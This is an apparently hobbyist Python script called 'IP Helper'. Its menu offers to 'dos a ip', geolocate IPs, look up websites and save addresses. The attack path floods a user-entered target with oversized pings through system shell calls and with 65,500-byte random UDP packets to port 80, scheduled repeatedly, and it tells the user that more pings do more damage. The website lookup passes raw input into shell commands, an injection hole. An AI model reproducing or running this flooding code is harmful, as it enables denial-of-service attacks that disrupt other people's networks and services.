import threading
import random
import sys
import re

import os
import ipaddress 
import time
import asyncio
import socket
import json

from urllib.request import urlopen
from bs4 import BeautifulSoup as bs
from apscheduler.schedulers.background import BackgroundScheduler
from scapy.all import *



sched = BackgroundScheduler()
sched.start()

# System call
os.system("")

# Class of different styles
class style():
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'


loading = """
╔╗             ╔╗
║║             ║║
║║   ╔══╗╔══╗╔═╝║╔╗╔═╗─╔══╗
║║ ╔╗║╔╗║║╔╗║║╔╗║╠╣║╔╗╗║╔╗║
║╚═╝║║╚╝║║╔╗║║╚╝║║║║║║║║╚╝╠╦╦╗
╚═══╝╚══╝╚╝╚╝╚══╝╚╝╚╝╚╝╚═╗╠╩╩╝
                       ╔═╝║
                       ╚══╝"""


 

#save ips to a json file
def saveip():
    print(f"Enter the IP:")
    ip = input()
    try:
        print (ipaddress.ip_address(ip), "is a active ip address")
    except Exception as e:
        wait = input(f"The ip you entered is not a valid ip address.")
    #write to a json file
    json_object = json.dumps(ip, indent = 4) 
    with open("ips.json", "w") as outfile: 
        outfile.write(json_object) 

def loadip():
    with open('ips.json', 'r') as openfile: 
        json_object = json.load(openfile) 
    wait = input("IPS: \n" + json_object)

#create code that gets a area a ip is in
def locate():
    print(f"Enter the IP:")
    ip = input()
    try:
        print (ipaddress.ip_address(ip), "is a active ip address") 
    except Exception:
        wait = input("The ip you entered is not a valid ip address.")
    try:
        geody = "https://tools.keycdn.com/geo?host=" + ip
        html_page = urlopen(geody).read()
        soup = bs(html_page, features="html.parser")
        data = soup.find("div", {"class": "language-javascript"})
        print(soup)
    except Exception as e:
        print(e)
    ipstart()

#gets info on a ip, fix the port, add more info.
def ipinfo():
    print(f"Enter the IP:")
    ip = input()
    try:
        print (ipaddress.ip_address(ip), "is a active ip address") 
    except Exception:
        wait = input("The ip you entered is not a valid ip address.")
    try:
    #get the open ports of a ip
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((ip, 0))
        print('listening on port:', sock.getsockname()[1])
    except Exception as e:
        print(e)
    wait = input()


#dos a ip, want to add a proxy server
def ping(ip, size, amount: int):
    #ping pong, by by router
    try:
        os.system(f'ping -n {amount} -l {size} {ip}')
        ipstart()
    except Exception:
        print(f"The code can not ping the ip.")
        ipstart()

def bye(ip, size: int, amount: int):
    print("Getting ready to attack.")
    try:
        port = 80
        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        data = random._urandom(65500)
        udp.sendto(data, (ip, port))
        wait = input()
    except Exception as e:
        print(e)
        wait = input()


async def prepare(ip, size, amount: int):
    for i in range(amount):
        try:
            sched.add_job(func=ping, args=(ip, size, amount))
            sched.add_job(func=bye, args=(ip, size, amount))
        except Exception as e:
            print(e)


#prepare the attack
def attack():
    threads = []
    print(f"Enter the IP:")
    ip = input()
    #checks if the ip is valid or not
    try:
        print (ipaddress.ip_address(ip), "is a active ip address") 
    except Exception:
        print("The ip you entered is not a valid ip address.")
        ipstart()
    print("How many pings would you like to do? The more the merrier!(The more you have the longer it takes, but more damage is done, you need more to affect the ip.)")
    amount = int(input())
    print("What do you want the size of the ping to be?(anything over 15k bytes will time out a lot of times, sometimes it doesn't, you can't do anything over 65000 bytes. The reccomended size is 15k.)")
    size = int(input())
    asyncio.run(prepare(ip, size, amount))



#get a website info
def getweb():
    print("Enter the website to use.")
    website = input()
    #uses commands to get website info
    os.system(f'ping -n 1 {website}')
    os.system(f'tracert {website}')
    os.system(f'nslookup {website}')
    ipstart()



#start the code
def ipstart():
    print(f"""{style.RED}

    
    
██╗██████╗
██║██╔══██╗
██║██████╔╝ 
██║██╔═══╝  
██║██║       
╚═╝╚═╝  
{style.BLUE}
 ██╗  ██╗███████╗██      ██████╗ ███████╗██████╗
 ██║  ██║██╔════╝██║     ██╔══██╗██╔════╝██╔══██╗
 ███████║█████╗  ██      ██████╔╝█████╗  ██████╔╝
 ██╔  ██║██╔══╝  ██║     ██╔═══╝ ██╔══╝  ██╔══██╗
 ██║  ██║███████╗███████╗██║     ███████╗██║  ██║
 ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚══════╝╚═╝  ╚═╝   
    """)
    print(style.WHITE, """What action would you like to take?
    - attack {dos a ip}
    - get {get a websites ip}
    - locate {get the area a ip is located in}
    - ipinfo {see all public info on a ip}
    - saveip {saves a ip in a json file}
    - loadip {loads all your saved ips}""")
    #does the action the user says.
    action = input()
    if action == "attack":
        print(style.CYAN, loading, style.RESET)
        time.sleep(3)
        attack()
    elif action == "get":
        print(style.CYAN, loading, style.RESET)
        time.sleep(3)
        getweb()
    elif action == "locate":
        print(style.CYAN, loading, style.RESET)
        time.sleep(3)
        locate()
    elif action == "ipinfo":
        print(style.CYAN, loading, style.RESET)
        time.sleep(3)
        ipinfo()
    elif action == "saveip":
        print(style.CYAN, loading, style.RESET)
        time.sleep(3)
        saveip()
    elif action == "loadip":
        print(style.CYAN, loading, style.RESET)
        time.sleep(3)
        loadip()
    else:
        print("You did not enter a correct action to perform!")
        print(style.CYAN, loading, style.RESET)
        time.sleep(3)
        ipstart()


ipstart()

